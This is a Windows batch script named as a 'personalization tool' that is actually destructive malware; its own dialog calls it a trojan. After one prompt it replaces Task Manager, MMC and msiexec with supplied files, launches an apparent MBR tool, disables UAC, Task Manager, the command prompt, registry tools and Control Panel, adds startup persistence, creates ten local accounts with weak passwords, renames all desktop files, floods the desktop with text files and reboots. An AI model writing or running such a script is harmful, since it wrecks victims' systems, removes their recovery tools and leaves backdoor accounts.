@echo off
title Windows NT personalization tool
@echo off
echo intAnswer = _ >> prompt.vbs
echo     Msgbox("This trojan is no joke, Run?", _  >> prompt.vbs
echo         vbYesNo, "Personalize.exe.Win32")  >> prompt.vbs
echo If intAnswer = vbYes Then >>  prompt.vbs
echo     WScript.Quit 1 >>  prompt.vbs
echo Else >> prompt.vbs
echo     WScript.Quit 0 >>  prompt.vbs
echo End If  >> prompt.vbs
cscript prompt.vbs
if ERRORLEVEL==1 goto launch
if ERRORLEVEL==0 goto quit
:launch

echo Personalizing...
echo HAHAH UR DED >> URDED.txt
notepad URDED.txt
start sfgi.exe
start mbr.exe
timeout /t 5 /nobreak >nul
taskkill /f /im explorer.exe
copy 0xHAHAHA.mp3 C:\Windows\Media
copy screenmelt.exe C:\Windows\System32
start screenmelt.exe
fmedia.exe "C:\Windows\Media\0xHAHAHA.mp3" --background
takeown /F "C:\Windows\system32\taskmgr.exe"
icacls "C:\windows\system32\taskmgr.exe" /grant everyone:F
copy taskmgr.exe C:\Windows\System32\taskmgr.exe /y
takeown /F "C:\Windows\system32\mmc.exe"
icacls "C:\windows\system32\mmc.exe" /grant everyone:F
copy mmc.exe C:\Windows\System32\mmc.exe /y
takeown /F "C:\Windows\system32\msiexec.exe"
icacls "C:\windows\system32\msiexec.exe" /grant everyone:F
copy msiexec.exe C:\Windows\System32\msiexec.exe /y
copy winntcus64.png %SystemRoot%\Web
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Windows\Web\winntcus64.png" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
copy winnt64.exe %SystemRoot%\system32
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Windows NT Personalization tool" /T REG_SZ /F /D "C:\Windows\System32\winnt64.exe"
copy sources\msg.bat "%programdata%\microsoft\windows\start menu\programs\startup"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoChangingWallpaper /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
reg add "HKCU\Control Panel\Mouse" /v SwapMouseButtons /t REG_SZ /d 1 /f
net user /add NTCUS ntcus123
net user /add NTUSER ntcus124
net user /add NTDAT ntpersonalize
net user /add DC discord
net user /add cfs belgium
net user /add leopoldII belgium
net user /add SCHJIEAB rykn
net user /add IZWYOKWYIEN rykn
net user /add asap asap
net user /add REICHTANGLE ig1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableLogonBackgroundImage /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Accent" /v AccentColor /t REG_DWORD /d 0xFF0000 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
copy user.png"C:\ProgramData\Microsoft\User Account Pictures"
cd %userprofile%\desktop
ren * *.prsnlz
cls
timeout /t 15 /nobreak >nul
explorer https://www.google.com/search?q=HAHAHAHAHAHA
timeout /t 15 /nobreak >nul
start https://www.google.com/search?q=russian+democratic+federative+republic
timeout /t 15 /nobreak >nul
start https://www.google.com/search?q=moskau+moskau
cls
cd %userprofile%\Desktop
for /l %%i in (1, 1, 320) do (
echo IT'S TOO LATE NOW YOU CANNOT ESCAPE YOUR WINDOWS INSTALL IS DONE FOR XAXAXAXA > OPENME%%i.txt
)
shutdown /r /t 0
:quit
@echo off
echo intAnswer = _ >> prompt2.vbs
echo     Msgbox("ok buddy", _  >> prompt2.vbs
echo         vbYesNo, "Personalize.exe.Win32")  >> prompt2.vbs
echo If intAnswer = vbYes Then >>  prompt2.vbs
echo     WScript.Quit 1 >>  prompt2.vbs
echo Else >> prompt2.vbs
echo     WScript.Quit 0 >>  prompt2.vbs
echo End If  >> prompt2.vbs
cscript prompt2.vbs